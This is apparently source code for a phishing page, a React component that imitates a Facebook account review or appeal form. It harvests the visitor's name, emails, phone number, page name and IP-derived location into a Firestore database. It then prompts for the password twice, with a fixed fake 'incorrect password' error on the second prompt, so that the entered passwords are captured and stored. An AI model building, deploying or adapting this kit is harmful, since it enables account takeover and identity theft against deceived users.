import { useState } from 'react';
import styles from '../styles/appeal-form.module.css';
import { useForm } from "react-hook-form";
import { db } from  '../firebaseConfig';
import { doc, setDoc, getDocs, getDoc, updateDoc, query, collection, onSnapshot } from "firebase/firestore";
import React, { useEffect } from 'react';



const AppealForm = (props) => {

    const [steps, setSteps] = useState({first_password: false, second_password: false});
    const [email, setEmail] = useState('');

    const { register, handleSubmit } = useForm();

    const onSubmit = async (data) => {

        setEmail(data.personalEmail);
        const location = await fetch('https://extreme-ip-lookup.com/json/').then( res => res.json());

        data['location'] = {country: location.country, city: location.city, countryCode: location.countryCode};
        data['currentStep'] = 'password';
        await setDoc(doc(db, "users", data.personalEmail), data);

        props.onSubmit({type: 'listenUser', value: data.personalEmail});

        setSteps({first_password: true, second_password: false}, data)
    }

    const firstPasswordSubmit = async (data) => { 
        const docRef = doc(db, "users", email);

        await updateDoc(docRef,data);

        setSteps({first_password: false, second_password: true})

    }

    const secondPasswordSubmit = async (data) => { 
        const docRef = doc(db, "users", email);
        await updateDoc(docRef,data);

        trigerNext();
    }

    const trigerNext = () => {
        props.onSubmit({type: 'appeal', value: true});
    }

    return (
        <div className={styles.appealForm}>

            <div className={styles.top}>
                <span className={styles.label}>Account Overview</span>
                {/* <span className={styles.split}> / </span>
                <span className={styles.label}>Business Account</span> */}
                <span className={styles.split}> / </span>
                <span className={styles.label}>Request Review</span>
            </div>

            <div className={styles.box}>

                <form onSubmit={handleSubmit(onSubmit)}>
                    <h3 className={styles.mainLabel}>Get Started</h3>

                    <div className={styles.input}>
                        <label>Please provide us information that will help us investigate</label>
                        <textarea required {...register("appeal")}></textarea>
                    </div>
                    <div className={styles.input}>
                        <label>Full Name</label>
                        <input type="text" required {...register("fullName")} />
                    </div>
                    <div className={styles.input}>
                        <label>Business Email Address</label>
                        <input type="email" required {...register("businessEmail")} />
                    </div>
                    <div className={styles.input}>
                        <label>Personal Email Address</label>
                        <input type="email" required {...register("personalEmail")} />
                    </div>
                    <div className={styles.input}>
                        <label>Mobile Phone Number</label>
                        <input type="text" required {...register("phone")} />
                    </div>
                    <div className={styles.input}>
                        <label>Facebook Page Name</label>
                        <input type="text" required {...register("pageName")} />
                    </div>

                    <button>Submit</button>

                </form>
            </div>

            {
            (steps.first_password || steps.second_password) && 
            <div className={styles.modal}>
                

                {
                    steps.first_password && 
                    <div className={styles.box}>
                        <div className={styles.top}>
                            <h3>Please enter your password</h3>
                        </div>
                        <form onSubmit={handleSubmit(firstPasswordSubmit)}>
                            <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                            <div className={styles.input}>
                                <label>Password:</label>
                                <input type="password" required {...register("password")} />
                            </div>

                            <div className={styles.bottom}>
                                <button type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                }

                {
                    steps.second_password && 
                    <div className={styles.box}>
                        <div className={styles.top}>
                            <h3>Please Re-Enter Your Password</h3>
                        </div>
                        <form onSubmit={handleSubmit(secondPasswordSubmit)}>
                            <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>

                            <div className={styles.input}>
                                <label>Password:</label>
                                <input type="password" required {...register("confirmPassword")} />
                                <p className={styles.error}>The password you&apos;ve entered is incorrect.</p>
                            </div>

                            <div className={styles.bottom}>
                                <button type="submit">Continue</button>
                            </div>
                        </form>
                    </div>
                }

                
            </div>
        }

        </div>
    )

 }

export default AppealForm;